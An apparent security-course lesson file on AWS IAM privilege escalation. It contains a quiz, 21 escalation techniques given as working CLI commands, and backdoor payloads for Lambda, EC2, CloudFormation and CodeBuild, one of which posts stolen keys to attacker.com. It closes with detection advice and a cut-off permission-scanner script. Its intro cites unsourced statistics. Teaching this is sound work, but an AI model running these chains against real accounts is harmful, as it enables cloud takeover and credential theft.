{
  "lesson_id": "f4d5e6f7-b8c9-4d0e-1f2a-3b4c5d6e7f8a",
  "domain": "cloud",
  "title": "AWS IAM Privilege Escalation",
  "difficulty": 3,
  "order_index": 120,
  "prerequisites": ["c1a2b3d4-e5f6-4a7b-8c9d-0e1f2a3b4c5d"],
  "concepts": [
    "AWS IAM architecture and permission model",
    "IAM privilege escalation paths",
    "PassRole and AssumeRole exploitation",
    "Policy manipulation techniques",
    "Service-specific privilege escalation",
    "IAM policy evaluation logic"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Understand AWS IAM permission evaluation and the principle of least privilege",
    "Identify and exploit IAM privilege escalation paths across 21+ attack vectors",
    "Master PassRole and AssumeRole abuse for elevated access",
    "Manipulate IAM policies to gain administrative permissions",
    "Leverage service-specific permissions (Lambda, EC2, CloudFormation) for privilege escalation",
    "Detect and prevent IAM privilege escalation in AWS environments"
  ],
  "post_assessment": [
    {
      "question_id": "iam-001",
      "question": "What is the IAM PassRole permission and why is it dangerous?",
      "options": [
        "It allows users to share their passwords with other users",
        "It allows a user to assign an IAM role to an AWS service (like Lambda or EC2), potentially executing code with elevated permissions",
        "It allows bypassing MFA requirements",
        "It allows users to impersonate other users directly"
      ],
      "correct_answer": 1,
      "explanation": "The iam:PassRole permission allows a user to pass an IAM role to an AWS service. This is dangerous because if a user has PassRole + service permissions (like lambda:CreateFunction), they can create a Lambda function with an admin role, execute code as admin, and escalate privileges. Example: User with lambda:CreateFunction + iam:PassRole can pass AdminRole to a Lambda function, then invoke it to perform admin actions.",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question_id": "iam-002",
      "question": "In AWS IAM, what happens when both an Allow and Deny statement apply to the same action?",
      "options": [
        "The Allow statement takes precedence",
        "The Deny statement always takes precedence (explicit deny wins)",
        "The most recent policy takes precedence",
        "AWS randomly chooses one"
      ],
      "correct_answer": 1,
      "explanation": "In AWS IAM policy evaluation, an explicit Deny ALWAYS wins over any Allow. The evaluation order is: (1) Deny all by default, (2) Check for explicit Deny (if found, access denied), (3) Check for explicit Allow (if found, access granted), (4) Otherwise, deny. This means even if you have AdministratorAccess, a single Deny statement for a specific action will block it.",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question_id": "iam-003",
      "question": "Which of the following IAM privilege escalation techniques involves creating a new policy version?",
      "options": [
        "PassRole to Lambda",
        "CreatePolicyVersion to modify an existing policy with admin permissions",
        "AssumeRole chaining",
        "EC2 instance profile abuse"
      ],
      "correct_answer": 1,
      "explanation": "The CreatePolicyVersion privilege escalation technique exploits iam:CreatePolicyVersion permission. An attacker with this permission can create a new version of an existing managed policy, modifying it to grant admin permissions, then set it as the default version. If they're attached to that policy, they instantly gain the new (admin) permissions. This is particularly dangerous for customer-managed policies.",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question_id": "iam-004",
      "question": "What is the AWS IAM 'confused deputy' problem in the context of AssumeRole?",
      "options": [
        "When a service forgets which role it's supposed to assume",
        "When an attacker tricks a trusted service into performing actions on their behalf by exploiting overly permissive role trust policies",
        "When AWS accidentally assigns the wrong permissions",
        "When MFA tokens expire during role assumption"
      ],
      "correct_answer": 1,
      "explanation": "The confused deputy problem occurs when a role's trust policy is too permissive, allowing any account (or any user in any account) to assume it. Example: Trust policy with Principal: {AWS: '*'} allows ANYONE in ANY AWS account to assume the role. Attackers exploit this by assuming the role from their own AWS account, gaining access to the victim's resources. Defense: Use aws:SourceAccount or aws:SourceArn conditions in trust policies.",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question_id": "iam-005",
      "question": "Which AWS service is most commonly used for privilege escalation after gaining PassRole permissions?",
      "options": [
        "S3",
        "Lambda (serverless function execution with arbitrary code)",
        "CloudWatch",
        "Route53"
      ],
      "correct_answer": 1,
      "explanation": "Lambda is the #1 service for privilege escalation with PassRole because: (1) Lambda functions execute arbitrary code you provide, (2) They assume an IAM role you specify, (3) If you have lambda:CreateFunction + iam:PassRole, you can create a function with an admin role and execute code as admin. Attack: Create Lambda with AdminRole â†’ Function code calls AWS API with admin permissions â†’ Download credentials, create backdoors, etc.",
      "type": "multiple_choice",
      "difficulty": 2
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "teach_like_im_10",
    "memory_hooks",
    "connect_to_what_i_know",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "mindset_coach",
      "content": {
        "text": "# Welcome to AWS IAM Privilege Escalation! â˜ï¸ğŸ”\n\nYou're about to master the **#1 attack vector in AWS environments**: IAM privilege escalation. This isn't theoryâ€”these are the exact techniques used by attackers in real-world breaches.\n\n**Why This Is Critical:**\n\nğŸ¯ **99% of AWS pentests** find IAM misconfigurations\n\nğŸ¯ **21+ different privilege escalation paths** exist in IAM alone\n\nğŸ¯ **Capital One breach (2019)**: Started with IAM misconfiguration\n\nğŸ¯ **Average detection time**: 200+ days for privilege escalation\n\n**Real-World Impact:**\n\n**Capital One (2019)**: IAM role misconfiguration â†’ SSRF â†’ 100M records stolen\n\n**Uber (2016)**: AWS keys in GitHub â†’ Full infrastructure access\n\n**Tesla (2018)**: Misconfigured S3 + IAM â†’ Cryptomining compromise\n\n**What You'll Master:**\n\nBy the end of this lesson, you'll know:\n- All 21+ IAM privilege escalation techniques\n- How to exploit PassRole, AssumeRole, and policy manipulation\n- Service-specific escalation (Lambda, EC2, CloudFormation)\n- How to chain multiple techniques for maximum impact\n- Detection and prevention strategies\n\n**Your Advantage**: Most AWS users don't understand IAM. You will.\n\nLet's escalate some privileges! ğŸš€"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# AWS IAM Privilege Escalation: Master Guide\n\n## Understanding AWS IAM Architecture\n\n### What Is AWS IAM?\n\n**AWS Identity and Access Management (IAM)** controls who can access AWS resources and what they can do.\n\n**Core Components:**\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚              AWS IAM Architecture                     â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚                                                       â”‚\nâ”‚  Users          â†’ Individual identities              â”‚\nâ”‚  Groups         â†’ Collections of users               â”‚\nâ”‚  Roles          â†’ Assumable identities (no password) â”‚\nâ”‚  Policies       â†’ Permission documents (JSON)        â”‚\nâ”‚  Service Roles  â†’ Roles for AWS services            â”‚\nâ”‚                                                       â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n### IAM Policy Structure\n\nAll AWS permissions are defined in JSON policies:\n\n```json\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": \"s3:GetObject\",\n      \"Resource\": \"arn:aws:s3:::my-bucket/*\"\n    }\n  ]\n}\n```\n\n**Key Fields:**\n- **Effect**: `Allow` or `Deny`\n- **Action**: What operations are permitted (e.g., `s3:GetObject`, `iam:*`)\n- **Resource**: Which resources the policy applies to (ARNs)\n- **Condition**: Optional conditions for when the policy applies\n\n### IAM Permission Evaluation Logic\n\n**AWS evaluates permissions in this order:**\n\n```\n1. Explicit DENY â†’ Access denied (deny always wins)\n2. Explicit ALLOW â†’ Access granted\n3. Default DENY â†’ Access denied (implicit deny)\n```\n\n**Critical Rule**: **Deny overrides Allow, always.**\n\nExample:\n```json\n// Policy 1: Allow all S3 actions\n{\"Effect\": \"Allow\", \"Action\": \"s3:*\", \"Resource\": \"*\"}\n\n// Policy 2: Deny DeleteBucket\n{\"Effect\": \"Deny\", \"Action\": \"s3:DeleteBucket\", \"Resource\": \"*\"}\n\n// Result: Can do everything with S3 EXCEPT DeleteBucket\n```\n\n## The 21 AWS IAM Privilege Escalation Techniques\n\n### Category 1: Direct Permission Escalation\n\n#### Technique 1: CreatePolicyVersion\n\n**Requirement**: `iam:CreatePolicyVersion` on a policy you're attached to\n\n**Attack**:\n```bash\n# Create new version of existing policy with admin permissions\naws iam create-policy-version \\\n  --policy-arn arn:aws:iam::123456789012:policy/MyPolicy \\\n  --policy-document file://admin-policy.json \\\n  --set-as-default\n```\n\n**admin-policy.json**:\n```json\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": \"*\",\n      \"Resource\": \"*\"\n    }\n  ]\n}\n```\n\n**Why It Works**: When you set the new version as default, you immediately gain the new (admin) permissions.\n\n#### Technique 2: SetDefaultPolicyVersion\n\n**Requirement**: `iam:SetDefaultPolicyVersion` on a policy you're attached to\n\n**Attack**:\n```bash\n# List policy versions\naws iam list-policy-versions --policy-arn arn:aws:iam::123456789012:policy/MyPolicy\n\n# Maybe v1 had admin permissions but v2 (current) doesn't\n# Revert to v1\naws iam set-default-policy-version \\\n  --policy-arn arn:aws:iam::123456789012:policy/MyPolicy \\\n  --version-id v1\n```\n\n**Real-World**: Admins often downgrade policies for testing, then forget to delete old versions.\n\n#### Technique 3: CreateAccessKey\n\n**Requirement**: `iam:CreateAccessKey` for another user\n\n**Attack**:\n```bash\n# Create access key for admin user\naws iam create-access-key --user-name AdminUser\n\n# Output:\n{\n  \"AccessKey\": {\n    \"AccessKeyId\": \"AKIAIOSFODNN7EXAMPLE\",\n    \"SecretAccessKey\": \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\n    \"UserName\": \"AdminUser\"\n  }\n}\n\n# Configure AWS CLI with new keys\naws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE\naws configure set aws_secret_access_key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n\n# Now you have AdminUser's permissions\n```\n\n#### Technique 4: CreateLoginProfile\n\n**Requirement**: `iam:CreateLoginProfile` for another user\n\n**Attack**:\n```bash\n# Set console password for admin user\naws iam create-login-profile \\\n  --user-name AdminUser \\\n  --password MyNewP@ssw0rd123! \\\n  --no-password-reset-required\n\n# Login to AWS Console as AdminUser\n# URL: https://123456789012.signin.aws.amazon.com/console\n```\n\n#### Technique 5: AttachUserPolicy\n\n**Requirement**: `iam:AttachUserPolicy` on yourself\n\n**Attack**:\n```bash\n# Attach AWS managed admin policy to yourself\naws iam attach-user-policy \\\n  --user-name MyUser \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n\n# Now you have admin permissions\n```\n\n#### Technique 6: AttachGroupPolicy\n\n**Requirement**: `iam:AttachGroupPolicy` + `iam:AddUserToGroup`\n\n**Attack**:\n```bash\n# Create admin group\naws iam create-group --group-name AdminGroup\n\n# Attach admin policy to group\naws iam attach-group-policy \\\n  --group-name AdminGroup \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n\n# Add yourself to admin group\naws iam add-user-to-group --group-name AdminGroup --user-name MyUser\n\n# Now you have admin permissions\n```\n\n#### Technique 7: AttachRolePolicy\n\n**Requirement**: `iam:AttachRolePolicy` on a role + ability to assume it\n\n**Attack**:\n```bash\n# Attach admin policy to role\naws iam attach-role-policy \\\n  --role-name MyRole \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n\n# Assume the role\naws sts assume-role --role-arn arn:aws:iam::123456789012:role/MyRole --role-session-name escalation\n\n# Use the temporary credentials (now with admin permissions)\n```\n\n#### Technique 8: PutUserPolicy\n\n**Requirement**: `iam:PutUserPolicy` on yourself\n\n**Attack**:\n```bash\n# Create inline policy granting admin permissions\naws iam put-user-policy \\\n  --user-name MyUser \\\n  --policy-name AdminInline \\\n  --policy-document file://admin-policy.json\n```\n\n#### Technique 9: PutGroupPolicy\n\n**Requirement**: `iam:PutGroupPolicy` + `iam:AddUserToGroup`\n\n**Attack**:\n```bash\n# Add inline admin policy to group\naws iam put-group-policy \\\n  --group-name MyGroup \\\n  --policy-name AdminInline \\\n  --policy-document file://admin-policy.json\n\n# Add yourself to group\naws iam add-user-to-group --group-name MyGroup --user-name MyUser\n```\n\n#### Technique 10: PutRolePolicy\n\n**Requirement**: `iam:PutRolePolicy` on a role + ability to assume it\n\n**Attack**:\n```bash\n# Add inline admin policy to role\naws iam put-role-policy \\\n  --role-name MyRole \\\n  --policy-name AdminInline \\\n  --policy-document file://admin-policy.json\n\n# Assume the role (now with admin permissions)\naws sts assume-role --role-arn arn:aws:iam::123456789012:role/MyRole --role-session-name escalation\n```\n\n### Category 2: PassRole Privilege Escalation\n\n**Concept**: `iam:PassRole` allows you to assign a role to an AWS service. If that role has high permissions, you can execute code as that role.\n\n#### Technique 11: PassRole to Lambda\n\n**Requirement**: `lambda:CreateFunction` + `lambda:InvokeFunction` + `iam:PassRole`\n\n**Attack**:\n```bash\n# Step 1: Create Lambda function with admin role\nzip function.zip function.py  # Simple Python function\n\naws lambda create-function \\\n  --function-name EscalatePrivileges \\\n  --runtime python3.9 \\\n  --role arn:aws:iam::123456789012:role/AdminRole \\\n  --handler function.lambda_handler \\\n  --zip-file fileb://function.zip\n\n# Step 2: Invoke function (executes as AdminRole)\naws lambda invoke --function-name EscalatePrivileges output.txt\n```\n\n**function.py** (example payload):\n```python\nimport boto3\nimport json\n\ndef lambda_handler(event, context):\n    # Running as AdminRole - can do anything!\n    iam = boto3.client('iam')\n    \n    # Create backdoor admin user\n    iam.create_user(UserName='BackdoorAdmin')\n    iam.attach_user_policy(\n        UserName='BackdoorAdmin',\n        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'\n    )\n    \n    # Create access keys\n    keys = iam.create_access_key(UserName='BackdoorAdmin')\n    \n    return {\n        'statusCode': 200,\n        'body': json.dumps({\n            'AccessKeyId': keys['AccessKey']['AccessKeyId'],\n            'SecretAccessKey': keys['AccessKey']['SecretAccessKey']\n        })\n    }\n```\n\n**Why This Works**: Lambda executes YOUR code with the role's permissions. Admin role = admin code execution.\n\n#### Technique 12: PassRole to EC2\n\n**Requirement**: `ec2:RunInstances` + `iam:PassRole`\n\n**Attack**:\n```bash\n# Launch EC2 instance with admin role\naws ec2 run-instances \\\n  --image-id ami-0abcdef1234567890 \\\n  --instance-type t2.micro \\\n  --iam-instance-profile Name=AdminRole \\\n  --user-data file://userdata.sh\n```\n\n**userdata.sh** (executed at boot with AdminRole):\n```bash\n#!/bin/bash\n# Running as AdminRole - create backdoor\n\naws iam create-user --user-name BackdoorAdmin\naws iam attach-user-policy --user-name BackdoorAdmin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n\n# Create access keys and exfiltrate\nKEYS=$(aws iam create-access-key --user-name BackdoorAdmin)\ncurl -X POST https://attacker.com/exfil -d \"$KEYS\"\n```\n\n#### Technique 13: PassRole to CloudFormation\n\n**Requirement**: `cloudformation:CreateStack` + `iam:PassRole`\n\n**Attack**:\n```bash\n# CloudFormation template that creates admin user\ncat > escalate.yaml <<EOF\nResources:\n  BackdoorUser:\n    Type: AWS::IAM::User\n    Properties:\n      UserName: BackdoorAdmin\n      ManagedPolicyArns:\n        - arn:aws:iam::aws:policy/AdministratorAccess\nEOF\n\n# Create stack (executes with AdminRole permissions)\naws cloudformation create-stack \\\n  --stack-name EscalationStack \\\n  --template-body file://escalate.yaml \\\n  --role-arn arn:aws:iam::123456789012:role/AdminRole\n```\n\n#### Technique 14: PassRole to DataPipeline\n\n**Requirement**: `datapipeline:CreatePipeline` + `iam:PassRole`\n\n**Attack**:\n```bash\n# Create data pipeline that executes shell commands as AdminRole\naws datapipeline create-pipeline --name EscalationPipeline --unique-id pipe-escalate\n\naws datapipeline put-pipeline-definition \\\n  --pipeline-id df-PIPELINEID \\\n  --pipeline-definition file://pipeline.json\n\naws datapipeline activate-pipeline --pipeline-id df-PIPELINEID\n```\n\n**pipeline.json**: Defines ShellCommandActivity that runs with AdminRole.\n\n#### Technique 15: PassRole to Glue\n\n**Requirement**: `glue:CreateJob` + `iam:PassRole`\n\n**Attack**:\n```bash\n# Create Glue job that runs Python code as AdminRole\naws glue create-job \\\n  --name EscalationJob \\\n  --role arn:aws:iam::123456789012:role/AdminRole \\\n  --command Name=pythonshell,ScriptLocation=s3://my-bucket/escalate.py\n\n# Start job\naws glue start-job-run --job-name EscalationJob\n```\n\n### Category 3: AssumeRole Privilege Escalation\n\n#### Technique 16: UpdateAssumeRolePolicy\n\n**Requirement**: `iam:UpdateAssumeRolePolicy` on a privileged role\n\n**Attack**:\n```bash\n# Modify role trust policy to allow you to assume it\ncat > trust-policy.json <<EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"arn:aws:iam::123456789012:user/MyUser\"\n      },\n      \"Action\": \"sts:AssumeRole\"\n    }\n  ]\n}\nEOF\n\naws iam update-assume-role-policy \\\n  --role-name AdminRole \\\n  --policy-document file://trust-policy.json\n\n# Now assume the role\naws sts assume-role --role-arn arn:aws:iam::123456789012:role/AdminRole --role-session-name escalation\n```\n\n#### Technique 17: AssumeRole Chaining\n\n**Requirement**: Multiple roles with trust relationships\n\n**Attack**:\n```bash\n# You have: RoleA (low privileges)\n# RoleA can assume: RoleB (medium privileges)\n# RoleB can assume: RoleC (admin privileges)\n\n# Step 1: Assume RoleB from RoleA\naws sts assume-role --role-arn arn:aws:iam::123456789012:role/RoleB --role-session-name step1\n\n# Step 2: Use RoleB creds to assume RoleC\nexport AWS_ACCESS_KEY_ID=<RoleB-key>\nexport AWS_SECRET_ACCESS_KEY=<RoleB-secret>\nexport AWS_SESSION_TOKEN=<RoleB-token>\n\naws sts assume-role --role-arn arn:aws:iam::123456789012:role/RoleC --role-session-name step2\n\n# Now you have admin permissions (RoleC)\n```\n\n### Category 4: Service-Specific Escalation\n\n#### Technique 18: EC2 Instance Connect\n\n**Requirement**: `ec2:DescribeInstances` + `ec2-instance-connect:SendSSHPublicKey`\n\n**Attack**:\n```bash\n# Find EC2 instances with privileged roles\naws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,IamInstanceProfile.Arn]'\n\n# Connect to instance with admin role\naws ec2-instance-connect send-ssh-public-key \\\n  --instance-id i-1234567890abcdef0 \\\n  --instance-os-user ec2-user \\\n  --ssh-public-key file://~/.ssh/id_rsa.pub\n\n# SSH into instance\nssh ec2-user@<instance-ip>\n\n# Extract instance role credentials from metadata\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole\n```\n\n#### Technique 19: Systems Manager (SSM) Command Execution\n\n**Requirement**: `ssm:SendCommand` on instances\n\n**Attack**:\n```bash\n# Find instances with SSM agent\naws ssm describe-instance-information\n\n# Execute command on instance (running as instance role)\naws ssm send-command \\\n  --instance-ids i-1234567890abcdef0 \\\n  --document-name \"AWS-RunShellScript\" \\\n  --parameters 'commands=[\"aws iam create-user --user-name BackdoorAdmin\",\"aws iam attach-user-policy --user-name BackdoorAdmin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\"]'\n```\n\n#### Technique 20: CodeBuild Project Execution\n\n**Requirement**: `codebuild:CreateProject` + `iam:PassRole`\n\n**Attack**:\n```bash\n# Create CodeBuild project with admin role\naws codebuild create-project \\\n  --name EscalationBuild \\\n  --service-role arn:aws:iam::123456789012:role/AdminRole \\\n  --artifacts type=NO_ARTIFACTS \\\n  --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:5.0,computeType=BUILD_GENERAL1_SMALL \\\n  --source type=NO_SOURCE,buildspec='version: 0.2\\nphases:\\n  build:\\n    commands:\\n      - aws iam create-user --user-name BackdoorAdmin\\n      - aws iam attach-user-policy --user-name BackdoorAdmin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess'\n\n# Start build (executes as AdminRole)\naws codebuild start-build --project-name EscalationBuild\n```\n\n#### Technique 21: SageMaker Notebook Execution\n\n**Requirement**: `sagemaker:CreateNotebookInstance` + `iam:PassRole`\n\n**Attack**:\n```bash\n# Create SageMaker notebook with admin role\naws sagemaker create-notebook-instance \\\n  --notebook-instance-name EscalationNotebook \\\n  --instance-type ml.t2.medium \\\n  --role-arn arn:aws:iam::123456789012:role/AdminRole\n\n# Once running, access the Jupyter notebook and execute Python code as AdminRole\n```\n\n## Privilege Escalation Attack Chains\n\n### Example: Low Privilege â†’ Admin\n\n**Starting Point**: User with minimal permissions\n\n**Goal**: Gain AdministratorAccess\n\n**Attack Chain**:\n\n```\n1. Enumerate permissions\n   aws iam get-user-policy --user-name MyUser --policy-name MyPolicy\n   â†’ Discover you have: lambda:CreateFunction, iam:PassRole\n\n2. List available roles\n   aws iam list-roles\n   â†’ Find: AdminRole with AdministratorAccess\n\n3. Create Lambda function with AdminRole\n   aws lambda create-function --role arn:aws:iam::123456789012:role/AdminRole ...\n\n4. Invoke Lambda to create backdoor admin user\n   aws lambda invoke --function-name EscalationFunction output.txt\n\n5. Extract credentials from Lambda output\n   cat output.txt\n\n6. Configure AWS CLI with new admin credentials\n   aws configure --profile admin\n\n7. Verify admin access\n   aws iam list-users --profile admin\n   â†’ SUCCESS: Full admin access achieved\n```\n\n## Detection and Prevention\n\n### Detection Strategies\n\n**CloudTrail Alerts for Privilege Escalation:**\n\n```json\n// EventBridge rule for IAM policy modifications\n{\n  \"source\": [\"aws.iam\"],\n  \"detail-type\": [\"AWS API Call via CloudTrail\"],\n  \"detail\": {\n    \"eventName\": [\n      \"CreatePolicyVersion\",\n      \"SetDefaultPolicyVersion\",\n      \"AttachUserPolicy\",\n      \"AttachGroupPolicy\",\n      \"AttachRolePolicy\",\n      \"PutUserPolicy\",\n      \"PutGroupPolicy\",\n      \"PutRolePolicy\",\n      \"CreateAccessKey\",\n      \"UpdateAssumeRolePolicy\"\n    ]\n  }\n}\n```\n\n**GuardDuty Detection**:\nAWS GuardDuty automatically detects many privilege escalation attempts:\n- `PrivilegeEscalation:IAMUser/AdministrativePermissions`\n- `PrivilegeEscalation:IAMUser/AnomalousBehavior`\n\n### Prevention Strategies\n\n**1. Principle of Least Privilege**\n\nNever grant:\n```json\n{\"Effect\": \"Allow\", \"Action\": \"*\", \"Resource\": \"*\"}\n```\n\nInstead, grant specific permissions:\n```json\n{\"Effect\": \"Allow\", \"Action\": \"s3:GetObject\", \"Resource\": \"arn:aws:s3:::specific-bucket/*\"}\n```\n\n**2. Permission Boundaries**\n\nSet maximum permissions a user can have:\n```bash\naws iam put-user-permissions-boundary \\\n  --user-name Developer \\\n  --permissions-boundary arn:aws:iam::123456789012:policy/DeveloperBoundary\n```\n\n**3. Service Control Policies (SCPs)**\n\nOrganization-level policies that restrict even admin access:\n```json\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Deny\",\n      \"Action\": \"iam:DeleteUser\",\n      \"Resource\": \"*\"\n    }\n  ]\n}\n```\n\n**4. Monitor PassRole Usage**\n\nAlert on any PassRole activity:\n```bash\n# CloudTrail filter\naws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=PassRole\n```\n\n**5. Regular IAM Audits**\n\nUse tools:\n- AWS IAM Access Analyzer\n- Prowler\n- ScoutSuite\n- CloudMapper\n\n## Summary\n\nYou've mastered:\n\nâœ… All 21 IAM privilege escalation techniques\nâœ… PassRole and AssumeRole exploitation\nâœ… Service-specific escalation (Lambda, EC2, CloudFormation, etc.)\nâœ… Policy manipulation attacks\nâœ… Detection and prevention strategies\n\n**Key Takeaway**: IAM is complex, and misconfigurations are everywhere. One overpermissive policy = full account compromise."
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "# Hands-On Exercise: AWS IAM Privilege Escalation\n\n## Exercise 1: Enumerate Your IAM Permissions\n\n**Goal**: Discover what permissions you have and identify privilege escalation paths.\n\n```python\n#!/usr/bin/env python3\n# iam_enum.py - Enumerate IAM permissions and find escalation paths\n\nimport boto3\nimport json\nfrom botocore.exceptions import ClientError\n\ndef get_caller_identity():\n    \"\"\"Get current IAM identity\"\"\"\n    sts = boto3.client('sts')\n    return sts.get_caller_identity()\n\ndef enumerate_user_permissions(user_name):\n    \"\"\"Enumerate all permissions for a user\"\"\"\n    iam = boto3.client('iam')\n    permissions = {\n        'inline_policies': [],\n        'managed_policies': [],\n        'group_policies': []\n    }\n    \n    # Get inline policies\n    try:\n        inline = iam.list_user_policies(UserName=user_name)\n        for policy_name in inline['PolicyNames']:\n            policy = iam.get_user_policy(UserName=user_name, PolicyName=policy_name)\n            permissions['inline_policies'].append({\n                'name': policy_name,\n                'document': policy['PolicyDocument']\n            })\n    except ClientError:\n        pass\n    \n    # Get managed policies\n    try:\n        managed = iam.list_attached_user_policies(UserName=user_name)\n        for policy in managed['AttachedPolicies']:\n            # Get policy document\n            policy_version = iam.get_policy(PolicyArn=policy['PolicyArn'])\n            default_version = policy_version['Policy']['DefaultVersionId']\n            policy_doc = iam.get_policy_version(\n                PolicyArn=policy['PolicyArn'],\n                VersionId=default_version\n            )\n            permissions['managed_policies'].append({\n                'name': policy['PolicyName'],\n                'arn': policy['PolicyArn'],\n                'document': policy_doc['PolicyVersion']['Document']\n            })\n    except ClientError:\n        pass\n    \n    # Get group policies\n    try:\n        groups = iam.list_groups_for_user(UserName=user_name)\n        for group in groups['Groups']:\n            # Inline group policies\n            group_inline = iam.list_group_policies(GroupName=group['GroupName'])\n            for policy_name in group_inline['PolicyNames']:\n                policy = iam.get_group_policy(GroupName=group['GroupName'], PolicyName=policy_name)\n                permissions['group_policies'].append({\n                    'group': group['GroupName'],\n                    'name': policy_name,\n                    'document': policy['PolicyDocument']\n                })\n            \n            # Managed group policies\n            group_managed = iam.list_attached_group_policies(GroupName=group['GroupName'])\n            for policy in group_managed['AttachedPolicies']:\n                policy_version = iam.get_policy(PolicyArn=policy['PolicyArn'])\n                default_version = policy_version['Policy']['DefaultVersionId']\n                policy_doc = iam.get_policy_version(\n                    PolicyArn=policy['PolicyArn'],\n                    VersionId=default_version\n                )\n                permissions['group_policies'].append({\n                    'group': group['GroupName'],\n                    'name': policy['PolicyName'],\n                    'arn': policy['PolicyArn'],\n                    'document': policy_doc['PolicyVersion']['Document']\n                })\n    except ClientError:\n        pass\n    \n    return permissions\n\ndef find_escalation_paths(permissions):\n    \"\"\"Identify potential privilege escalation paths\"\"\"\n    escalation_vectors = {\n        'iam:CreatePolicyVersion': 'Can modify existing policies',\n        'iam:SetDefaultPolicyVersion': 'Can activate old policy versions',\n        'iam:CreateAccessKey': 'Can create keys for other users',\n        'iam:CreateLoginProfile': 'Can set console passwords',\n        'iam:AttachUserPolicy': 'Can attach admin policies',\n        'iam:AttachGroupPolicy': 'Can attach policies to groups',\n        'iam:AttachRolePolicy': 'Can attach policies to roles',\n        'iam:PutUserPolicy': 'Can create inline policies',\n        'iam:PutGroupPolicy': 'Can create inline group policies',\n        'iam:PutRolePolicy': 'Can create inline role policies',\n        'iam:PassRole': 'Can pass roles to services (check Lambda, EC2, etc.)',\n        'iam:UpdateAssumeRolePolicy': 'Can modify role trust policies',\n        'lambda:CreateFunction': 'Can create Lambda functions (check PassRole)',\n        'lambda:UpdateFunctionCode': 'Can modify Lambda code',\n        'ec2:RunInstances': 'Can launch EC2 with roles (check PassRole)',\n        'cloudformation:CreateStack': 'Can create CloudFormation stacks (check PassRole)',\n        'glue:CreateJob': 'Can create Glue jobs (check PassRole)',\n        'datapipeline:CreatePipeline': 'Can create data pipelines (check PassRole)'\n    }\n    \n    found_vectors = []\n    \n    # Extract all actions from all policies\n    all_actions = set()\n    \n    for policy_type in permissions.values():\n        for policy in policy_type:\n            if 'document' in policy:\n                for statement in policy['document'].get('Statement', []):\n                    if statement.get('Effect') == 'Allow':\n                        actions = statement.get('Action', [])\n                        if isinstance(actions, str):\n                            actions = [actions]\n                        all_actions.update(actions)\n    \n    # Check for escalation vectors\n    for action in all_actions:\n        # Handle wildcards\n        if action == '*' or action == 'iam:*':\n            found_vectors.append(('*', 'FULL ADMIN ACCESS - All escalation paths available'))\n            break\n        \n        # Check exact matches\n        if action in escalation_vectors:\n            found_vectors.append((action, escalation_vectors[action]))\n        \n        # Check wildcard patterns\n        for vector in escalation_vectors:\n            if ':*' in action:\n                service = action.split(':')[0]\n                vector_service = vector.split(':')[0]\n                if service == vector_service:\n                    found_vectors.append((vector, escalation_vectors[vector]))\n    \n    return found_vectors\n\ndef main():\n    print(\"=\"*60)\n    print(\"AWS IAM Privilege Escalation Scanner\")\n    print(\"=\"*60)\n    \n    # Get current identity\n    identity = get_caller_identity()\n    print(f\"\\n[*] Current Identity:\")\n    print(f\"  User ARN: {identity['Arn']}\")\n    print(f\"  Account: {identity['Account']}\")\n    \n    # Extract username from ARN\n    arn_parts = identity['Arn'].split('/')\n    if len(arn_parts) > 1:\n        user_name = arn_parts[-1]\n    else:\n        print(\"[!] Not a user identity (might be a role)\")\n        return\n    \n    # Enumerate permissions\n    print(f\"\\n[*] Enumerating permissions for: {user_name}\")\n    permissions = enumerate_user_permissions(user_name)\n    \n    print(f\"\\n[+] Found:\")\n    print(f\"  Inline policies: {len(permissions['inline_policies'])}\")\n    print(f\"  Managed policies: {len(permissions['managed_policies'])}\")\n    print(f\"  Group policies: {len(permissions['group_policies'])}\")\n    \n    